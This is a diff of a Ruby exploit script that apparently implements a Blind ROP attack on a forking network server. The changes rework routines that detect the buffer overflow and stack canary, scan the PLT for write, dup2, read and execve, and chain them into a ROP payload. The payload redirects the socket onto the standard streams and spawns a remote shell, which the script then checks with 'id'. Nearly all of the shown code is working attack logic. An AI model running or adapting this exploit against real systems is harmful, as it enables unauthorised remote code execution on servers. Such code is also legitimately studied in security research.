@@ -322,14 +322,25 @@ def check_overflow_len()
 
 	s.close()
 
-	if len == 4112 and not $canary
+	if not $canary
+		print("Found overflow len #{len}\n")
 		canary_detect(len - 8)
+
 		print("Trying again with canary...\n")
 		check_overflow_len()
-		return
+
+		print("Couldn't find overflow_len") if not $overflow_len
+		print("Couldn't find canary\n") if not $canary
 	end
 
-	print("WARNING unexpected overflow len\n") if len != expected
+#	if len == 4112 and not $canary
+#		canary_detect(len - 8)
+#		print("Trying again with canary...\n")
+#		check_overflow_len()
+#		return
+#	end
+#
+#	print("WARNING unexpected overflow len\n") if len != expected
 
 	$overflow_len = len
 end
@@ -826,13 +837,14 @@ def dump_addr(addr)
 
 	rop = []
 
-	rop << $rdi - 2
-	rop << fd
-	rop << 0
+	#rop << $rdi - 2
+	#rop << fd
+	#rop << 0
 
-	plt_fn(rop, $dup)
+	#plt_fn(rop, $dup2)
 	#rop << ($plt + 0xb)
-	#rop << $dup
+	#rop << $dup2
+	call_dup2(rop, $file_desc, fd)
 
 	for i in 0..20
 		set_rdx(rop)
@@ -1036,30 +1048,6 @@ def try_plt(depth, plt)
 	return false
 end
 
-def find_write()
-	write = $plt
-
-	print("Finding write\n")
-
-	while true
-		print("Trying #{write.to_s(16)}\r")
-
-		x = dump_fd_addr(20, 0x400000, write, 50)
-		if x.length == 84 and x[1] == 'E'
-			printf("\nwrite at #{write.to_s(16)} (#{x.length})\n")
-			$write = write
-			return
-		end
-
-		write += 0x10
-
-		if write > ($plt + 200 * 0x10) 
-			print("Trying again\n")
-			write = $plt
-		end
-	end
-end
-
 def set_rdx(rop, good = 0x400000)
 #	good = 0x400000
 #	good = $vsyscall + 100
@@ -1083,7 +1071,7 @@ def got_write(x)
 ## 		return if x.length != 4
 ## 	end
 
-	return if x.length < 4
+	return false if x.length < 4
 
 	return false if x[1] != 'E'
 	return false if x[2] != 'L'
@@ -1092,127 +1080,35 @@ def got_write(x)
 	return true
 end
 
-def try_write(listeners, write)
-	if call_plt(write, $death, $death) != true
-		print("Skippin #{write.to_s(16)}\n")
-		return false
-	end
-
-	listc = 50
-
-	for l in listeners
-		begin
-			x = l.recv_nonblock(1)
-			if x.length == 0
-				l.close()
-				listeners.delete(l)
-				next
-			end
-		rescue Errno::EAGAIN
-		end
-	end
-
-	conn = 0
-
-	while listeners.length < listc
-		listeners << get_child()
-		conn += 1
-	end
-
-#	print("Connected #{conn} listeners\n") if conn > 0
+def try_write3(write, fd, rep, sl)
+	print("Trying write #{write} with fd #{fd}    \r")
 
 	addr = 0x400000
-	fd = 15
 
 	rop = []
 
-	set_rdx(rop) if $canary
+	set_rdx(rop)
+
+	rop << $rdi - 2
+	rop << addr
+	rop << 0
 
 	rop << $rdi
 	rop << fd
 
-	rop << $rdi - 2
-	rop << 0x400000
-	rop << 0
-
 	plt_fn(rop, write)
-	#rop << ($plt + 0xb)
-	#rop << write
-#	rop << write
-#	rop << write
-
-#	need = $depth - rop.length
-#	need.times do
-#		rop << $plt
-#	end
 	rop << $death
 
-        s = get_child()
-        send_exp(s, rop)
-	s.close()
-
-	($to / 0.01).to_i.times do
-		for l in listeners
-			begin
-				x = l.recv_nonblock(4096)
-				if x.length == 0
-					l.close()
-					listeners.delete(l)
-					next
-				end
-
-				if got_write(x)
-					for l in listeners
-						l.close()
-					end
-					return true
-				end
-
-				abort("dunno")
-			rescue Errno::EAGAIN
-			end
-		end
-		sleep(0.01)
-	end
-
-	return false
-end
-
-def try_write2(write)
-	addr = 0x400000
-
-	rop = []
-
-	for fd in 0..50
-		set_rdx(rop)
-
-		rop << $rdi - 2
-		rop << 0x400000
-		rop << 0
-
-		rop << $rdi
-		rop << fd
-
-		#rop << ($plt + 0xb)
-		#rop << write
-		plt_fn(rop, write)
-	end
-
-	rop << $death
-
-        s = get_child()
-        send_exp(s, rop)
+	# dmccrady:  try the exploit
+	s = get_child()
+	send_exp(s, rop)
 
 	stuff = ""
 
-	sl = 0.01
-	rep = $to.to_f / 0.01
-	rep = rep.to_i
 	rep.times do
 		begin
 			x = s.recv_nonblock(4096)
 			break if x.length == 0
-
 			stuff += x
 		rescue Errno::EAGAIN
 		rescue Errno::ECONNRESET
@@ -1220,40 +1116,43 @@ def try_write2(write)
 		end
 		sleep(sl)
 	end
-	s.close()
 
-	return got_write(stuff)
+	if got_write(stuff)
+		printf("\nFound write at #{write} and fd #{fd}\n")
+		$file_desc = fd
+		$write = write
+		return true
+	end
+
+	return false
 end
 
-def find_write2()
-	print("Finding write (2)\n")
+
+def find_write3()
+	print("Finding write (3)\n")
 
 	# dmccrady:  Hard-coded.  This works around a problem where, when scanning
 	# the PLT for 'write', we encounter 'memcpy_chk', which crashes the process
 	# and actually causes re-randomization.  Index 0x100 is known to lie beyond
 	# the poisonous entry
-	write = 0x100
+	write_start = 0x10f
+	# dmcccrady:  Another hard-code.  The 'write' entry is known to lie within
+	# the first 0x300 entries.
+	write_last = 0x300
 
-	while true
-		print("Trying #{write.to_s(16)}\r")
+	sl = 0.01
+	rep = $to.to_f / 0.01
+	rep = rep.to_i
 
-		if try_write2(write)
-			printf("\nwrite at #{write.to_s(16)}\n")
-			$write = write
-			return
-		end
-
-		write += 1
-
-		# dmccrady: Another hard-code.  The 'write' entry is known to lie within
-		# the first 0x300 entries
-		if write > 0x300
-			print("\nDidn't find write, bailing\n")
-			exit(1)
+	for write in write_start..write_last
+		for fd in 0..30
+			return if try_write3(write, fd, rep, sl)
 		end
 	end
-	exit(1)
+
+	abort("Failed to find write")
 end
+
 
 def stack_read()
 	print("Stack reading\n")
@@ -1588,7 +1487,8 @@ def find_plt_depth()
 	$depth = 18
 	$pad   = 0
 
-	find_plt(4)
+	probe_depth = 8
+	find_plt(probe_depth)
 
 #	if not $plt
 #		print("Assuming conf worker = 1\n")
@@ -1653,22 +1553,28 @@ def find_rdx()
 		end
 	end
 
-	print("\nFailed to find strcmp\n")
+	abort("Failed to find strcmp")
 	$strcmp = nil
 end
 
-def find_dup()
+def find_dup2()
+	abort("write not found") if not $write
+	abort("fd not found") if not $file_desc
+
 	print("Find dup2\n")
 
-	fd = 100
+	target_fd = 100
 
 	for i in 0..200
 		print("Trying dup2 at #{i.to_s(16)}\r")
 
 		rop = []
 
+		rop << $rdi
+		rop << $file_desc
+
 		rop << $rdi - 2
-		rop << fd
+		rop << target_fd
 		rop << 0
 
 		#rop << ($plt + 0xb)
@@ -1678,7 +1584,7 @@ def find_dup()
 		set_rdx(rop)
 
 		rop << $rdi
-		rop << fd
+		rop << target_fd
 
 		rop << $rdi - 2
 		rop << 0x400000
@@ -1697,72 +1603,15 @@ def find_dup()
 		s.close()
 
 		if got_write(x)
-			print("\nFound dup at #{i.to_s(16)}\n")
-			$dup = i
-			break
+			print("\nFound dup2 at #{i.to_s(16)}\n")
+			$dup2 = i
+			return 
 		end
 	end
 
-	print("\ndup not found\n") if not $dup
+	abort("dup2 not found")
 end
 
-# dmccrady Find dup2.  'dup' is not found in the PLT
-def find_dup2()
-	print("Find dup2()\n")
-
-	fd = 100
-
-	for i in 0..200
-		print("Trying dup2() at #{i.to_s(16)}\r")
-
-		rop = []
-
-		# DJM: rop to call dup2
-
-		rop << $rdi
-		rop << fd
-
-		rop << $rdi - 2
-		rop << fd + 1
-		rop << 0
-
-		#rop << ($plt + 0xb)
-		#rop << i
-		plt_fn(rop, i)
-
-
-		set_rdx(rop)
-
-		rop << $rdi
-		rop << fd
-
-		rop << $rdi - 2
-		rop << 0x400000
-		rop << 0
-
-		#rop << ($plt + 0xb)
-		#rop << $write
-		plt_fn(rop, $write)
-
-		rop << $death
-
-		s = get_child()
-		send_exp(s, rop)
-
-		x = s.recv(4096)
-
-		s.close()
-
-		if got_write(x)
-			print("\nFound dup2() at #{i.to_s(16)}\n")
-			$dup = i
-			break
-		end
-	end
-
-	print("\ndup2() not found\n") if not $dup
-end
-	
 
 def do_read(rop, fd, writable, read = $read)
 	rop << $rdi
@@ -1788,7 +1637,20 @@ def do_read(rop, fd, writable, read = $read)
 	plt_fn(rop, $write)
 end
 
+def call_usleep(rop, sl)
+	abort("usleep not found yet") if not $usleep
+
+	rop << $rdi
+	rop << 1000 * 1000 * 2
+
+	#rop << ($plt + 0xb)
+	#rop << $usleep
+	plt_fn(rop, $usleep)
+end
+
 def do_read2(rop, fd, writable)
+
+    # 1. Call write
 	set_rdx(rop, $goodrdx)
 
 	rop << $rdi
@@ -1801,13 +1663,11 @@ def do_read2(rop, fd, writable)
 	#rop << ($plt + 0xb)
 	#rop << $write
 	plt_fn(rop, $write)
-	rop << $rdi
-	rop << 1000 * 1000 * 2
 
-	#rop << ($plt + 0xb)
-	#rop << $usleep
-	plt_fn(rop, $usleep)
+	# 2. Call usleep for 2 seconds
+	call_usleep(rop, 1000 * 1000 * 2)
 
+	# 3. Call read
 	set_rdx(rop, $goodrdx)
 
 	rop << $rdi
@@ -1821,6 +1681,8 @@ def do_read2(rop, fd, writable)
 	#rop << $read
 	plt_fn(rop, $read)
 
+	# 4. Call write
+
 	set_rdx(rop, $goodrdx)
 
 	rop << $rdi
@@ -1833,6 +1695,7 @@ def do_read2(rop, fd, writable)
 	#rop << ($plt + 0xb)
 	#rop << $write
 	plt_fn(rop, $write)
+
 end
 
 def find_read()
@@ -1849,13 +1712,14 @@ def find_read()
 
 		rop = []
 
-		rop << $rdi - 2
-		rop << fd
-		rop << 0
+		#rop << $rdi - 2
+		#rop << fd
+		#rop << 0
 
 		#rop << ($plt + 0xb)
-		#rop << $dup
-		plt_fn(rop, $dup)
+		#rop << $dup2
+		#plt_fn(rop, $dup2)
+		call_dup2(rop, $file_desc, fd)
 
 		set_rdx(rop)
 		do_read(rop, fd, writable, i)
@@ -1892,7 +1756,19 @@ def find_read()
 	end
 end
 
+def call_dup2(rop, oldfd, newfd)
+	rop << $rdi - 2
+	rop << newfd
+	rop << 0
+
+	rop << $rdi
+	rop << oldfd
+
+	plt_fn(rop, $dup2)
+end
+
 def dup_fd(rop, fd, src = false)
+	abort("Don't call this dup_fd function")
 	rop << $rdi - 2
 	rop << fd
 	rop << 0
@@ -1903,8 +1779,8 @@ def dup_fd(rop, fd, src = false)
 	end
 
 	#rop << ($plt + 0xb)
-	#rop << $dup
-	plt_fn(rop, $dup)
+	#rop << $dup2
+	plt_fn(rop, $dup2)
 end
 
 def find_good_rdx()
@@ -1917,7 +1793,8 @@ def find_good_rdx()
 	while true
 		rop = []
 
-		dup_fd(rop, fd)
+		#dup_fd(rop, fd)
+		call_dup2(rop, $file_desc, fd)
 		set_rdx(rop, addr)
 
 		rop << $rdi
@@ -1936,7 +1813,7 @@ def find_good_rdx()
 		send_exp(s, rop)
 		x = s.recv(4096)
 
-		print("GOT #{x.length} at #{addr.to_s(16)}\n")
+		print("find_good_rdx GOT #{x.length} at #{addr.to_s(16)}\n")
 
 		if x.length >= 8
 			$goodrdx = addr
@@ -1948,8 +1825,10 @@ def find_good_rdx()
 	end
 end
 
-def do_execve(i = $execve)
-	print("Trying execve at #{i.to_s(16)}\r")
+def do_execve()
+	abort("execve() not previously found") if not $execve
+
+	print("\nTrying execve at #{$execve}, writing to #{$writable.to_s(16)}\n")
 
 	fd = 100
 
@@ -1959,12 +1838,18 @@ def do_execve(i = $execve)
 
 	rop = []
 
-	dup_fd(rop, fd)
-	dup_fd(rop, 0, fd)
-	dup_fd(rop, 1, fd)
-	dup_fd(rop, 2, fd)
+	#dup_fd(rop, fd)
+	#dup_fd(rop, 0, fd)
+	#dup_fd(rop, 1, fd)
+	#dup_fd(rop, 2, fd)
+	call_dup2(rop, $file_desc, fd)
+	call_dup2(rop, fd, 0)
+	call_dup2(rop, fd, 1)
+	call_dup2(rop, fd, 2)
 
 	do_read2(rop, fd, writable)
+
+	# Call execve
 
 	set_rdx(rop, 0x400000 + 8)
 
@@ -1977,7 +1862,7 @@ def do_execve(i = $execve)
 
 	#rop << ($plt + 0xb)
 	#rop << i
-	plt_fn(rop, i)
+	plt_fn(rop, $execve)
 	rop << $death
 
 	s = get_child()
@@ -2000,7 +1885,7 @@ def do_execve(i = $execve)
 
 		stuff += x
 
-		print("Got #{x.length}\n")
+		print("do_execve received length  #{x.length}, stuff=#{stuff}\n")
 
 		break if stuff.include?(str)
 	end
@@ -2025,8 +1910,9 @@ def do_execve(i = $execve)
 		break if x.length == 0
 
 		if x.include?("uid")
-			print("\nFound execve at #{i.to_s(16)}\n")
-			$execve = i
+			#print("\nFound execve at #{i.to_s(16)}\n")
+			#$execve = i  #DJM
+			print("\n\nPWWWNNND!\n\n")
 			save_state()
 			print_progress()
 			s.write("uname -a\nid\n")
@@ -2040,15 +1926,6 @@ def do_execve(i = $execve)
 	s.close()
 end
 
-def find_execve()
-	print("Finding exec\n")
-
-	for i in 0..200
-		do_execve(i)
-	end
-
-	print("\n")
-end
 
 # search for ascii ZERO ascii
 def has_str(stuff, skip = 0, strict = false)
@@ -2133,7 +2010,7 @@ def read_sym()
 	dynstr = 0
 
 	while true
-		print("Reading #{addr.to_s(16)}\r")
+		print("Reading #{addr.to_s(16)}\n")
 		x = dump_addr(addr)
 		break if x.length == 0
 
@@ -2246,7 +2123,7 @@ def read_sym()
 
 			if val > 0x500000
 				$writable = val
-				print("Writable at #{$writable.to_s(16)}\n")
+				print("Setting writable to #{$writable.to_s(16)}, sym=#{symname}\n")
 			end
 		end
 
@@ -2337,7 +2214,7 @@ def read_rel(addr, symtab)
 
 		num = prog[(idx + 8 + 4)..(idx + 8 + 4 + 3)].unpack("L<")[0]
 
-		abort("sdfasdf") if num >= symtab.length
+		#abort("sdfasdf") if num >= symtab.length   DJM... not sure why
 
 		name = symtab[num]
 
@@ -2433,7 +2310,8 @@ def pwn()
 	print_progress()
 
 #	find_write() if not $write
-	find_write2() if not $write
+#	find_write2() if not $write
+	find_write3() if not $write
 	print_progress()
 #	find_rdi() if not $rdi
 #	find_rsi() if not $rsi
@@ -2441,7 +2319,6 @@ def pwn()
 #	find_fd()
 
 	find_dup2() if not $dup2
-	find_dup() if not $dup
 
 	print_progress()
 
@@ -2453,7 +2330,8 @@ def pwn()
 
 	find_good_rdx() if not $goodrdx
 
-	find_execve() if not $execve
+#   dmccrady:  We already found execve by looking at the dynsym table.
+#	find_execve() if not $execve
 
 	do_execve()
 #	dump_bin()
@@ -2466,7 +2344,7 @@ end
 def do_state(save, silent = false)
 	vars = [ "pad", "ret", "overflow_len", "depth", "syscall", "pos",
 		 "pops", "rax", "rdi", "rsi", "vsyscall_mode", "canary",
-		 "canary_offset", "plt", "write", "to", "strcmp", "dup",
+		 "canary_offset", "plt", "write", "to", "strcmp", "dup2", "plt_base", "file_desc",
 		 "read", "execve", "goodrdx", "aslr", "writable", "usleep",
 		 "ftruncate64", "exit" ]
 
